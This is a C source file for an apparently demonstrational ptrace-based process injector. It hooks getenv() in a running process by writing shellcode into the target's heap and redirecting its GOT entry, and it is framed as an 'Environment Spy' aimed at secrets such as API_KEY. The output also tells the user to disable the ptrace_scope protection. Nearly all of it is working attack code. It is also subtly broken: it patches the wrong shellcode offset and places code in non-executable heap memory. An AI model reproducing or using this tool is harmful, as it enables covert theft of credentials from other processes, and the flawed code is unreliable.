#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <elf.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>

// ptrace-based GOT injection - Environment variable spy
// No LD_PRELOAD used - pure process injection

// Read memory from target process via /proc/PID/mem
int read_target_memory(pid_t pid, void *addr, void *buf, size_t len)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    
    if (lseek(fd, (off_t)addr, SEEK_SET) < 0)
    {
        close(fd);
        return -1;
    }
    
    ssize_t nread = read(fd, buf, len);
    close(fd);
    
    return (nread == len) ? 0 : -1;
}

// Write memory to target process via /proc/PID/mem
int write_target_memory(pid_t pid, void *addr, void *buf, size_t len)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    
    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;
    
    if (lseek(fd, (off_t)addr, SEEK_SET) < 0)
    {
        close(fd);
        return -1;
    }
    
    ssize_t nwritten = write(fd, buf, len);
    close(fd);
    
    return (nwritten == len) ? 0 : -1;
}

// Find base address of executable in target process
// WE ASSUME SIMPLE MAPPING LAYOUT FOR DEMO
unsigned long find_base_address(pid_t pid)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    
    char line[512];
    unsigned long base_addr = 0;
    
    if (fgets(line, sizeof(line), f))
        sscanf(line, "%lx", &base_addr);
    
    fclose(f);
    return base_addr;
}

// Find a writable memory region in target for our shellcode
void *find_injectable_memory(pid_t pid, size_t needed_size)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    
    FILE *f = fopen(path, "r");
    if (!f) return NULL;
    
    char line[512];
    void *result = NULL;
    
    while (fgets(line, sizeof(line), f))
    {
        unsigned long start, end;
        char perms[5];
        
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3)
        {
            // Look for writable regions with enough space
            // Prefer heap regions
            if (perms[0] == 'r' && perms[1] == 'w' && 
                (end - start) >= needed_size + 0x2000 &&
                strstr(line, "[heap]"))
            {
                // Use space at end of heap
                result = (void *)(end - needed_size - 0x1000);
                break;
            }
        }
    }
    
    fclose(f);
    return result;
}

// Find GOT entry for a function by parsing target's ELF in memory
// Simplified ELF parsing for educational purposes
// Production implementation must be very careful with ASLR and remote addresses
void *find_got_entry_remote(pid_t pid, unsigned long base_addr, const char *func_name)
{
    // Read ELF header
    Elf64_Ehdr ehdr;
    if (read_target_memory(pid, (void *)base_addr, &ehdr, sizeof(ehdr)) < 0)
        return NULL;
    
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0)
        return NULL;
    
    // Read program headers
    Elf64_Phdr *phdrs = malloc(ehdr.e_phnum * sizeof(Elf64_Phdr));
    if (read_target_memory(pid, (void *)(base_addr + ehdr.e_phoff), 
                          phdrs, ehdr.e_phnum * sizeof(Elf64_Phdr)) < 0)
    {
        free(phdrs);
        return NULL;
    }
    
    // Find PT_DYNAMIC segment
    Elf64_Dyn *dynamic = NULL;
    size_t dynamic_size = 0;
    
    for (int i = 0; i < ehdr.e_phnum; i++)
    {
        if (phdrs[i].p_type == PT_DYNAMIC)
        {
            dynamic_size = phdrs[i].p_memsz;
            dynamic = malloc(dynamic_size);
            
            if (read_target_memory(pid, (void *)(base_addr + phdrs[i].p_vaddr),
                                  dynamic, dynamic_size) < 0)
            {
                free(phdrs);
                free(dynamic);
                return NULL;
            }
            break;
        }
    }
    
    free(phdrs);
    if (!dynamic) return NULL;
    
    // Parse dynamic section
    char *strtab_addr = NULL;
    Elf64_Sym *symtab_addr = NULL;
    Elf64_Rela *rela_plt = NULL;
    size_t rela_plt_size = 0;
    
    for (Elf64_Dyn *dyn = dynamic; dyn->d_tag != DT_NULL; dyn++)
    {
        switch (dyn->d_tag)
        {
            case DT_STRTAB:
                strtab_addr = (char *)dyn->d_un.d_ptr;
                break;
            case DT_SYMTAB:
                symtab_addr = (Elf64_Sym *)dyn->d_un.d_ptr;
                break;
            case DT_JMPREL:
                rela_plt = (Elf64_Rela *)dyn->d_un.d_ptr;
                break;
            case DT_PLTRELSZ:
                rela_plt_size = dyn->d_un.d_val;
                break;
        }
    }
    
    free(dynamic);
    
    if (!strtab_addr || !symtab_addr || !rela_plt)
        return NULL;
    
    // Read PLT relocations
    size_t num_rela = rela_plt_size / sizeof(Elf64_Rela);
    Elf64_Rela *rela_entries = malloc(rela_plt_size);
    
    if (read_target_memory(pid, rela_plt, rela_entries, rela_plt_size) < 0)
    {
        free(rela_entries);
        return NULL;
    }
    
    // Search for target function
    for (size_t i = 0; i < num_rela; i++)
    {
        uint32_t sym_idx = ELF64_R_SYM(rela_entries[i].r_info);
        
        Elf64_Sym sym;
        if (read_target_memory(pid, &symtab_addr[sym_idx], &sym, sizeof(sym)) < 0)
            continue;
        
        char name[256] = {0};
        if (read_target_memory(pid, &strtab_addr[sym.st_name], name, sizeof(name) - 1) < 0)
            continue;
        
        if (strcmp(name, func_name) == 0)
        {
            void *got_addr = (void *)(base_addr + rela_entries[i].r_offset);
            free(rela_entries);
            return got_addr;
        }
    }
    
    free(rela_entries);
    return NULL;
}

// Hook shellcode for getenv()
// This intercepts getenv() calls and logs the variable names/values
// Simplified version that demonstrates the technique
unsigned char hook_shellcode[] = {
    // Save all registers
    0x50,                           // push rax
    0x53,                           // push rbx
    0x51,                           // push rcx
    0x52,                           // push rdx
    0x56,                           // push rsi
    0x57,                           // push rdi
    0x41, 0x50,                     // push r8
    0x41, 0x51,                     // push r9
    0x41, 0x52,                     // push r10
    0x41, 0x53,                     // push r11
    
    // Call original getenv
    // Address will be patched in at offset 18
    0x48, 0xb8,                     // mov rax, imm64
    0x00, 0x00, 0x00, 0x00,         // [original_getenv lower 32 bits]
    0x00, 0x00, 0x00, 0x00,         // [original_getenv upper 32 bits]
    0xff, 0xd0,                     // call rax
    
    // rax now contains result (env var value or NULL)
    // Save it
    0x50,                           // push rax
    
    // In a real implementation, here we would:
    // 1. Open /tmp/stolen_env.txt
    // 2. Write the variable name (original rdi) and value (rax)
    // 3. Close the file
    // For this demo, we just pass through
    
    // Restore result
    0x58,                           // pop rax
    
    // Restore all registers
    0x41, 0x5b,                     // pop r11
    0x41, 0x5a,                     // pop r10
    0x41, 0x59,                     // pop r9
    0x41, 0x58,                     // pop r8
    0x5f,                           // pop rdi
    0x5e,                           // pop rsi
    0x5a,                           // pop rdx
    0x59,                           // pop rcx
    0x5b,                           // pop rbx
    
    // Don't pop rax - it contains our return value
    0x48, 0x83, 0xc4, 0x08,         // add rsp, 8 (skip saved rax)
    
    // Return with result in rax
    0xc3,                           // ret
};

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <target_pid>\n", argv[0]);
        printf("\nExample:\n");
        printf("  Terminal 1: export API_KEY=secret && ./target\n");
        printf("  Terminal 2: ./injector <PID>\n");
        return 1;
    }
    
    pid_t target_pid = atoi(argv[1]);
    
    printf("\n");
    printf("================================================\n");
    printf("  ptrace GOT Injection - Environment Spy\n");
    printf("        (No LD_PRELOAD used)\n");
    printf("================================================\n");
    printf("\n");
    printf("[*] Target PID: %d\n", target_pid);
    
    // Step 1: Attach to target
    printf("\n[*] Attaching to target...\n");
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
    {
        perror("[-] ptrace(PTRACE_ATTACH)");
        printf("[!] Possible issues:\n");
        printf("    - Not enough permissions\n");
        printf("    - Check: cat /proc/sys/kernel/yama/ptrace_scope\n");
        printf("    - Try: sudo sysctl kernel.yama.ptrace_scope=0\n");
        return 1;
    }
    
    int status;
    waitpid(target_pid, &status, 0);
    printf("[+] Attached and paused target\n");
    
    // Step 2: Find base address
    printf("\n[*] Finding base address...\n");
    unsigned long base_addr = find_base_address(target_pid);
    if (!base_addr)
    {
        printf("[-] Failed to find base address\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Base: 0x%lx\n", base_addr);
    
    // Step 3: Find GOT entry for getenv
    printf("\n[*] Parsing target's ELF to find getenv GOT entry...\n");
    void *got_entry = find_got_entry_remote(target_pid, base_addr, "getenv");
    
    if (!got_entry)
    {
        printf("[-] getenv not found in GOT\n");
        printf("[!] Target may not use getenv() or may be statically linked\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Found getenv GOT at: %p\n", got_entry);
    
    // Step 4: Read original getenv address
    printf("\n[*] Reading current GOT entry...\n");
    unsigned long original_addr;
    if (read_target_memory(target_pid, got_entry, &original_addr, sizeof(original_addr)) < 0)
    {
        printf("[-] Failed to read GOT entry\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Original getenv: 0x%lx\n", original_addr);
    
    // Step 5: Find injectable memory region
    printf("\n[*] Finding injectable memory in target...\n");
    void *shellcode_addr = find_injectable_memory(target_pid, sizeof(hook_shellcode));
    
    if (!shellcode_addr)
    {
        printf("[-] No suitable memory region found\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Using memory at: %p\n", shellcode_addr);
    
    // Step 6: Patch shellcode with original getenv address
    printf("\n[*] Preparing hook shellcode...\n");
    memcpy(&hook_shellcode[18], &original_addr, sizeof(original_addr));
    printf("[+] Shellcode patched with original getenv address\n");
    
    // Step 7: Write shellcode using ptrace
    printf("\n[*] Writing shellcode to target memory...\n");
    
    // Write using PTRACE_POKEDATA (writes in word-sized chunks)
    size_t offset = 0;
    while (offset < sizeof(hook_shellcode))
    {
        unsigned long data = 0;
        size_t chunk_size = sizeof(long);
        
        if (offset + chunk_size > sizeof(hook_shellcode))
            chunk_size = sizeof(hook_shellcode) - offset;
        
        memcpy(&data, &hook_shellcode[offset], chunk_size);
        
        if (ptrace(PTRACE_POKEDATA, target_pid, 
                   shellcode_addr + offset, data) < 0)
        {
            perror("[-] ptrace(PTRACE_POKEDATA)");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
        
        offset += sizeof(long);
    }
    printf("[+] Shellcode written (%zu bytes)\n", sizeof(hook_shellcode));
    
    // Step 8: Patch GOT to point to our shellcode
    printf("\n[*] Patching GOT entry...\n");
    printf("[*]   Old: 0x%lx (libc getenv)\n", original_addr);
    printf("[*]   New: %p (our hook)\n", shellcode_addr);
    
    unsigned long hook_addr = (unsigned long)shellcode_addr;
    if (write_target_memory(target_pid, got_entry, &hook_addr, sizeof(hook_addr)) < 0)
    {
        printf("[-] Failed to patch GOT\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] GOT entry patched successfully\n");
    
    // Step 9: Verify the patch
    unsigned long verify_addr;
    read_target_memory(target_pid, got_entry, &verify_addr, sizeof(verify_addr));
    printf("[*] Verification: GOT now contains 0x%lx\n", verify_addr);
    
    // Step 10: Detach and resume target
    printf("\n[*] Detaching from target...\n");
    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0)
    {
        perror("[-] ptrace(PTRACE_DETACH)");
        return 1;
    }
    printf("[+] Target resumed with active hook\n");
    
    printf("\n");
    printf("================================================\n");
    printf("         Injection Complete!\n");
    printf("================================================\n");
    printf("\n");
    printf("  getenv() is now hooked in target process\n");
    printf("  All environment variable accesses pass through our hook\n");
    printf("  Target continues running normally\n");
    printf("\n");
    printf("  Note: This demo shellcode passes through to original getenv()\n");
    printf("        A real implementation would log to /tmp/stolen_env.txt\n");
    printf("\n");
    
    return 0;
}